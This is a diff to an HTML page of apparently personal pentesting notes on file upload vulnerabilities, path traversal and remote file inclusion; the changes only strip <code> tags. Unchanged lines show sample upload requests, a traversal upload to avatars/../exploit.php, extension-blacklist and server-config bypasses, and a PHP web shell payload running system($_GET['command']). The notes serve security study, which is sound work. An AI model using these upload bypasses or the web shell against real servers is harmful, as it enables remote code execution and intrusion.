@@ -18,8 +18,6 @@
 
 <u>QUESTION TO ANSWER</u> Is this happening client or server-side...?  <br><br>
 
-<code>
-
 NOTES:<br><br>
 - if this file type is non-executable, such as an image or a static HTML page, the server may just send the file's contents to the client in the
 HTTP response.<br>
@@ -52,21 +50,15 @@ SAMPLE POST REQUEST<br><br>
 Content-Disposition: form-data; name="avatar"; filename="me2.php"<br>
 Content-Type: image/jpeg
 
-</code>
-
 <h2>2. LOCAL FILE INCLUSION</h2> 
 
 ....
 
 <h2>3. REMOTE FILE INCLUSION</h2>  
 
-<code>
-
-INFO: Collection of tools/commands to use when testing for remote file inclusion vulnerabilities. RFI</code><br><br>
+INFO: Collection of tools/commands to use when testing for remote file inclusion vulnerabilities. RFI<br><br>
 
 <u>VIA PATH TRAVERSAL</u><br><br>
-
-<code>
 
 NOTE:<br> <br>
 - Basicaly the techniques used when attempting path traversal can be used. it is chain of vulnerabilities to exploit the function.<br>
@@ -124,18 +116,14 @@ The file avatars/../exploit.php has been uploaded.<br><br>
 
 <a href="/my-account" title="Return to previous page"><« Back to My Account</a><br><br>
 
-You see the file was successfully uploaded, so, you need to go one folder back to test if the file is there.</code><br><br>
+You see the file was successfully uploaded, so, you need to go one folder back to test if the file is there.<br><br>
 
 <u>EXTENSION BLACKLIST BYPASS</u><br><br>
 
-<code>
-
 Such blacklists can sometimes be bypassed by using lesser known, alternative file extensions that may still be executable, such as .php5, 
-.shtml, and so on.</code><br><br>
+.shtml, and so on.<br><br>
 
 <u>OVERRIDE SERVER CONFIG</u><br><br>
-
-<code>
 
 servers typically won't execute files unless they have been configured to do so. before an Apache server will execute PHP files requested by a client, 
 developers might have to edit /etc/apache2/apache2.conf<br><br>
@@ -178,11 +166,7 @@ Content-Length: 164<br><br>
 
 Sorry, php files are not allowed.<br><br>
 
-</code>
-
 <u>EXPLOIT</u><br><br>
-
-<code>
 
 the response provide information about the web server you are working on, so you can search for default config files associated to the webserver you
 found. to attempt to force the app to use a different config file, you need to change a couple of parameters on the content disposition of the 
@@ -214,8 +198,6 @@ Content-Disposition: form-data; name="avatar"; filename="cumbia.l33t"<br>
 Content-Type: text/php<br><br>
 
 &lt;&quest;php echo system($_GET['command']); ?>
-
-</code>
 
     </article>
   </main>
